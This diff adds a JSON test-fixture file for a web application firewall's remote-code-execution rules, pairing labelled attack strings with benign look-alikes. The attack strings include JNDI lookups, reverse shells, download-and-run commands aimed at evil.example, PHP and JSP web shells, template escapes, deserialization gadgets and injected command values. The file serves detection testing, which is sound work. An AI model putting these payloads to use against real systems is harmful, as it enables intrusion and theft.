@@ -1,0 +1,556 @@
+{
+  "_comment": "Shared remote code execution cases, checked by aiwaf-rust (rce.rs) and Java (RceCore). Every attack must match its rule; every ordinary value, and every value in ordinary_text.json, must match none. form_attacks and ordinary_forms are whole form bodies or query strings; json_attacks and ordinary_json are whole JSON bodies, checked by the payload check; multipart_attacks and ordinary_multipart are whole multipart/form-data bodies, with the boundary ----aiwafBoundary7MA4YWxk.",
+  "attacks": [
+    [
+      "${jndi:ldap://evil.example/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "${${lower:j}${::-n}di:rmi://evil.example/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "${${::-j}${::-n}${::-d}${::-i}:dns://x}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "() { :; }; /bin/bash -c 'id'",
+      "rce_shellshock"
+    ],
+    [
+      "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
+      "rce_serialized_object"
+    ],
+    [
+      "aced0005737200",
+      "rce_serialized_object"
+    ],
+    [
+      "gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+      "rce_serialized_object"
+    ],
+    [
+      "O:8:\"Exploit\":1:{s:3:\"cmd\";s:2:\"id\";}",
+      "rce_serialized_object"
+    ],
+    [
+      "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+      "rce_serialized_object"
+    ],
+    [
+      "!!python/object/apply:os.system ['id']",
+      "rce_serialized_object"
+    ],
+    [
+      "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
+      "rce_expression"
+    ],
+    [
+      "T(java.lang.Runtime).getRuntime().exec('id')",
+      "rce_expression"
+    ],
+    [
+      "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
+      "rce_expression"
+    ],
+    [
+      "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+      "rce_template_escape"
+    ],
+    [
+      "{{ lipsum.__globals__['os'].popen('id').read() }}",
+      "rce_template_escape"
+    ],
+    [
+      "{{ cycler.__init__.__globals__.os.popen('id') }}",
+      "rce_template_escape"
+    ],
+    [
+      "require('child_process').exec('id')",
+      "rce_template_escape"
+    ],
+    [
+      "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "rce_shell_payload"
+    ],
+    [
+      "nc -e /bin/sh 10.0.0.1 4444",
+      "rce_shell_payload"
+    ],
+    [
+      "curl http://evil.example/x.sh | sh",
+      "rce_shell_payload"
+    ],
+    [
+      "x$(curl evil.example)",
+      "rce_shell_payload"
+    ],
+    [
+      "python3 -c 'import socket,os,pty'",
+      "rce_shell_payload"
+    ],
+    [
+      "<?php system($_GET['c']); ?>",
+      "rce_php"
+    ],
+    [
+      "php://filter/convert.base64-encode/resource=index.php",
+      "rce_php"
+    ],
+    [
+      "\\u0024\\u007bjndi:ldap://evil.example/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "&#36;&#123;jndi:ldap://evil.example/a&#125;",
+      "rce_jndi_lookup"
+    ],
+    [
+      "&dollar;&lbrace;jndi:rmi://evil.example/a&rbrace;",
+      "rce_jndi_lookup"
+    ],
+    [
+      "%u0024%u007bjndi:ldap://evil.example/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "${jn​di:ldap://evil.example/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "＄｛jndi:ldap://evil.example/a｝",
+      "rce_jndi_lookup"
+    ],
+    [
+      "${${date:'j'}ndi:ldap://evil.example/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://evil.example/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "${jndi:${lower:l}${lower:d}a${lower:p}://evil.example/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "JHtqbmRpOmxkYXA6Ly9ldmlsLmV4YW1wbGUvYX0=",
+      "rce_jndi_lookup"
+    ],
+    [
+      "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=",
+      "rce_shell_payload"
+    ],
+    [
+      "％{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
+      "rce_expression"
+    ],
+    [
+      "\\x24\\x7bjndi:ldap://x/a}",
+      "rce_jndi_lookup"
+    ],
+    [
+      "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.example/a\",\"autoCommit\":true}",
+      "rce_gadget"
+    ],
+    [
+      "{\"@type\":\"java.net.Inet4Address\",\"val\":\"probe.evil.example\"}",
+      "rce_gadget"
+    ],
+    [
+      "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://evil.example/a\"}]",
+      "rce_gadget"
+    ],
+    [
+      "<sorted-set><dynamic-proxy><interface>java.lang.Comparable</interface></dynamic-proxy></sorted-set>",
+      "rce_gadget"
+    ],
+    [
+      "<java><object class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"1\"><void index=\"0\"><string>id</string></void></array></object></java>",
+      "rce_gadget"
+    ],
+    [
+      "{\"__type\":\"System.IO.FileInfo, System.IO\"}",
+      "rce_serialized_object"
+    ],
+    [
+      "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())}",
+      "rce_expression"
+    ],
+    [
+      "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
+      "rce_expression"
+    ],
+    [
+      "(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name')))",
+      "rce_expression"
+    ],
+    [
+      "new ProcessBuilder(\"id\").start()",
+      "rce_expression"
+    ],
+    [
+      "{{['id']|filter('system')}}",
+      "rce_template_escape"
+    ],
+    [
+      "{system('id')}",
+      "rce_template_escape"
+    ],
+    [
+      "#set($e=$x.getClass())",
+      "rce_template_escape"
+    ],
+    [
+      "<% import os %>${os.popen('id').read()}",
+      "rce_template_escape"
+    ],
+    [
+      "<%= system('id') %>",
+      "rce_template_escape"
+    ],
+    [
+      "<%= `id` %>",
+      "rce_template_escape"
+    ],
+    [
+      "this.constructor.constructor('return process')().mainModule",
+      "rce_template_escape"
+    ],
+    [
+      "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>",
+      "rce_expression"
+    ],
+    [
+      "<%@ page import=\"java.io.*\" %>",
+      "rce_webshell"
+    ],
+    [
+      "<% eval request(\"c\") %>",
+      "rce_webshell"
+    ],
+    [
+      "<?= $_GET['f']($_GET['x']); ?>",
+      "rce_webshell"
+    ],
+    [
+      "@eval(base64_decode($_POST['z0']));",
+      "rce_webshell"
+    ],
+    [
+      "preg_replace('/.*/e', $_POST['c'], '')",
+      "rce_webshell"
+    ],
+    [
+      "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n",
+      "rce_script_upload"
+    ],
+    [
+      "form-data; name=\"upload\"; filename=\"cmd.jsp\"",
+      "rce_script_upload"
+    ],
+    [
+      "filename=\".htaccess\"",
+      "rce_script_upload"
+    ],
+    [
+      "x; cat /etc/passwd",
+      "rce_shell_payload"
+    ],
+    [
+      "a | /bin/sh -c 'id'",
+      "rce_shell_payload"
+    ],
+    [
+      "cat${IFS}/etc/passwd",
+      "rce_shell_payload"
+    ],
+    [
+      "wget http://evil.example/x -O /tmp/x",
+      "rce_shell_payload"
+    ],
+    [
+      "& type c:\\windows\\win.ini",
+      "rce_shell_payload"
+    ],
+    [
+      "certutil -urlcache -split -f http://evil.example/x.exe",
+      "rce_shell_payload"
+    ],
+    [
+      "regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll",
+      "rce_shell_payload"
+    ],
+    [
+      "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a')",
+      "rce_shell_payload"
+    ],
+    [
+      "mshta vbscript:Execute(\"x\")",
+      "rce_shell_payload"
+    ],
+    [
+      "com.sun.rowset.JdbcRowSetImpl",
+      "rce_gadget"
+    ],
+    [
+      "Skh0cWJtUnBPbXhrWVhBNkx5OWxkbWxzTG1WNFlXMXdiR1V2WVgwPQ==",
+      "rce_jndi_lookup"
+    ],
+    [
+      "WlROeloySkhiSGRqTTFaMFRHdzVabG95ZUhaWmJVWnpZekU1WmxkNVpIWmplV1JrVEc1Q2RtTkhWblZMUTJSd1drTmpjRXh1U214WlYxRnZTMU5DT1daUlBUMD0=",
+      "rce_template_escape"
+    ],
+    [
+      "H4sIAAAAAAAC/0tKLM5Q0M1UsFNT0E9JLdMvSS7QNzTQA0FDfRMgUDCwUzMEAEqllcgmAAAA",
+      "rce_shell_payload"
+    ],
+    [
+      "eJyzsS/IKFAoriwuSc3VUIl3dw2JVk9Wj9W0VrC3AwCGUQh+",
+      "rce_php"
+    ],
+    [
+      "H4sIAAAAAAAC/1vzloG1uIhBsCwxpzRVzyOxOAMAhRocvBIAAAA=",
+      "rce_serialized_object"
+    ],
+    [
+      "x;id",
+      "rce_command_injection"
+    ],
+    [
+      "1|id",
+      "rce_command_injection"
+    ],
+    [
+      "admin';id;",
+      "rce_command_injection"
+    ],
+    [
+      "test && whoami",
+      "rce_command_injection"
+    ],
+    [
+      "q=shoes; uname -a",
+      "rce_command_injection"
+    ],
+    [
+      "1 || sleep 5",
+      "rce_command_injection"
+    ],
+    [
+      "x; ping -c 10 127.0.0.1",
+      "rce_command_injection"
+    ],
+    [
+      "a\nwhoami",
+      "rce_command_injection"
+    ],
+    [
+      "test`id`",
+      "rce_command_injection"
+    ],
+    [
+      "name$(sleep 5)",
+      "rce_command_injection"
+    ],
+    [
+      "x | nslookup probe.evil.example",
+      "rce_command_injection"
+    ],
+    [
+      "1;ipconfig /all",
+      "rce_command_injection"
+    ],
+    [
+      "x;cat /proc/self/environ",
+      "rce_command_injection"
+    ],
+    [
+      "x'`id`",
+      "rce_command_injection"
+    ]
+  ],
+  "ordinary": [
+    "${HOME}/projects",
+    "${user.name} signed in",
+    "Price: ${price}",
+    "() => { return 1; }",
+    "function () { a(); }",
+    "class.name",
+    "The class loader failed",
+    "use php for scripts",
+    "O:8 is a chess opening",
+    "aced the exam",
+    "rO0",
+    "bash scripting tips",
+    "curl -s https://example.com",
+    "Use $(command) to substitute output",
+    "__init__.py",
+    "{{ user.name }}",
+    "/dev/null",
+    "nc for netcat",
+    "eval is evil",
+    "Python -c option",
+    "c:\\windows\\cmd.exe",
+    "{\"$type\": \"Order\"}",
+    "The constructor was called",
+    "process.env.NODE_ENV",
+    "{\"@context\": \"https://schema.org\", \"@type\": \"Person\", \"name\": \"Ada\"}",
+    "{\"@type\": \"Product\", \"sku\": \"A-1\"}",
+    "attachment; filename=\"report.pdf\"",
+    "form-data; name=\"avatar\"; filename=\"me.png\"",
+    "notes about php files",
+    "Tom &amp; Jerry",
+    "caf\\u00e9",
+    "Ｈｅｌｌｏ　ｗｏｒｌｄ",
+    "VGhpcyBpcyBhIHRlc3Qgc2VudGVuY2U=",
+    "eyJhbGciOiJIUzI1NiJ9",
+    "Q&A; see /etc/hosts for details",
+    "chmod 644 notes.txt",
+    "type C:\\Users\\me\\notes.txt",
+    "run sh -c to start it",
+    "<%= user.name %>",
+    "{% raw %}{{ x }}{% endraw %}",
+    "IEX is an exchange",
+    "constructor of the class",
+    "Use getClass() to find the type",
+    "#set the value",
+    "{php is great}",
+    "email: a@b.example; phone: 1",
+    "The file is at /tmp/report.txt",
+    "x = 1; y = 2",
+    "cats & dogs | pets",
+    "100% {ok}",
+    "&#169; 2026",
+    "Process.Start is a .NET API",
+    "new Builder()",
+    "filename is report.php in the docs",
+    "com.example.shop.Product",
+    "java.util.ArrayList",
+    "org.apache.commons.lang3.StringUtils",
+    "YW5WemRDQmhiaUJ2Y21ScGJtRnllU0J6Wlc1MFpXNWpaU0JvWlhKbA==",
+    "H4sIAAAAAAAC/8svSsnMSyyqVEjOzy0oSi0uTk1RyMsvSS0GAAS4GuEZAAAA",
+    "name; id",
+    "email; id; phone",
+    "The `id` field is required",
+    "Tom & Jerry",
+    "R&D; ID badges",
+    "I sleep 8 hours; then I wake",
+    "Rock && Roll",
+    "grep foo | sort",
+    "ping me when ready",
+    "whoami is a unix command",
+    "Use id; it's unique",
+    "item|id|name",
+    "sleep 5 minutes",
+    "hostname: example.com",
+    "The+`id`+field",
+    "a + `whoami` is a command"
+  ],
+  "form_attacks": [
+    [
+      "user=bob&data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
+      "rce_serialized_object"
+    ],
+    [
+      "user=bob&data=%AC%ED%00%05sr%00%11java.util.HashMap",
+      "rce_serialized_object"
+    ],
+    [
+      "id=7&state=gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg%3D%3D",
+      "rce_serialized_object"
+    ],
+    [
+      "a=1&p=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3B%7D",
+      "rce_serialized_object"
+    ],
+    [
+      "q=ok&blob=%80%04%95%1f%00%00%00%00%00%00%00%8c%05posix",
+      "rce_serialized_object"
+    ],
+    [
+      "__proto__[shell]=/bin/sh",
+      "rce_prototype_pollution"
+    ],
+    [
+      "user[__proto__][isAdmin]=1",
+      "rce_prototype_pollution"
+    ],
+    [
+      "a=1&constructor.prototype.env=x",
+      "rce_prototype_pollution"
+    ],
+    [
+      "x=1&__proto__.outputFunctionName=x",
+      "rce_prototype_pollution"
+    ]
+  ],
+  "json_attacks": [
+    [
+      "{\"__proto__\":{\"isAdmin\":true}}",
+      "rce_prototype_pollution"
+    ],
+    [
+      "{\"user\":{\"name\":\"a\",\"__proto__\":{\"shell\":\"/bin/sh\"}}}",
+      "rce_prototype_pollution"
+    ],
+    [
+      "{\"constructor\":{\"prototype\":{\"execArgv\":[\"--eval=1\"]}}}",
+      "rce_prototype_pollution"
+    ],
+    [
+      "[{\"a\":1},{\"constructor\":{\"prototype\":{\"x\":1}}}]",
+      "rce_prototype_pollution"
+    ]
+  ],
+  "ordinary_forms": [
+    "user=bob&email=bob%40example.com&remember=on",
+    "q=what+is+__proto__+in+javascript",
+    "title=Prototype+design&body=The+prototype+was+built+with+a+constructor",
+    "class=O%3A+level&note=C%3A%5Cdrive",
+    "data=aGVsbG8gd29ybGQgdGhpcyBpcyBmaW5l",
+    "sort=name&dir=asc&page=2&filter%5Bstatus%5D=open",
+    "product%5Bprototype%5D=1&product%5Bconstructor%5D=acme"
+  ],
+  "ordinary_json": [
+    "{\"constructor\":\"Acme Builders\",\"prototype\":true}",
+    "{\"constructor\":{\"name\":\"Acme\"}}",
+    "{\"note\":\"never use __proto__ as a key\"}",
+    "{\"proto\":\"http\",\"prototype_id\":4}"
+  ],
+  "multipart_attacks": [
+    [
+      "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\nPNG ordinary bytes\r\n------aiwafBoundary7MA4YWxk--\r\n",
+      "rce_script_upload"
+    ],
+    [
+      "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"me.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nJFIF<?php system($_GET['c']); ?>\r\n------aiwafBoundary7MA4YWxk--\r\n",
+      "rce_php"
+    ],
+    [
+      "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"a.txt\"\r\n\r\n<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>\r\n------aiwafBoundary7MA4YWxk--\r\n",
+      "rce_webshell"
+    ],
+    [
+      "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nhello\r\n------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n${jndi:ldap://evil.example/a}\r\n------aiwafBoundary7MA4YWxk--\r\n",
+      "rce_jndi_lookup"
+    ],
+    [
+      "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"__proto__[isAdmin]\"\r\n\r\n1\r\n------aiwafBoundary7MA4YWxk--\r\n",
+      "rce_prototype_pollution"
+    ],
+    [
+      "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1 OR 1=1\r\n------aiwafBoundary7MA4YWxk--\r\n",
+      "sql_breakout_numeric"
+    ],
+    [
+      "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"state\"\r\n\r\nrO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA\r\n------aiwafBoundary7MA4YWxk--\r\n",
+      "rce_serialized_object"
+    ]
+  ],
+  "ordinary_multipart": [
+    "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nHoliday photos\r\n------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"beach.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nJFIF ordinary bytes\r\n------aiwafBoundary7MA4YWxk--\r\n",
+    "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"notes\"; filename=\"notes.txt\"\r\nContent-Type: text/plain\r\n\r\nMeeting notes: we discussed ${HOME} paths and the select menu; then | pipes.\r\n------aiwafBoundary7MA4YWxk--\r\n",
+    "------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\nO'Reilly wrote: a = b; c = d\r\n------aiwafBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"prototype\"\r\n\r\nv2\r\n------aiwafBoundary7MA4YWxk--\r\n"
+  ]
+}
